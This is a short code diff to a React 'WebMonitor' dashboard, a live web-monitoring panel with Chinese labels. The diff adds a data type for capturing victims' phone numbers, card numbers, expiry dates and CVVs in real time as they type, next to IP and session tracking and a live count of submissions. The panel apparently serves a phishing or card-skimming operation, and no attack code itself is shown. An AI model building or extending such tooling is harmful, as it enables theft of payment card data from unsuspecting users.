@@ -20,6 +20,13 @@ interface UserSubmission {
   fieldsCount?: number;
   ipAddress?: string;
   sessionId?: string;
+  // 实时输入的敏感信息
+  realtimeInput?: {
+    phone?: string;
+    cardNumber?: string;
+    expiryDate?: string;
+    cvv?: string;
+  };
 }
 
 const submissionData: UserSubmission[] = [
@@ -167,7 +174,7 @@ export function WebMonitor() {
             <h1 className="text-lg font-medium text-foreground">网页实时监控</h1>
             <div className="flex items-center gap-2">
               <Badge variant="outline" className="bg-green-50 text-green-600 border-green-200">
-                ���� LIVE - {onlineCount} 在线处理
+                🔴 LIVE - {onlineCount} 在线处理
               </Badge>
               <Badge variant="outline" className="bg-blue-50 text-blue-600 border-blue-200">
                 今日提交: {todaySubmissions}
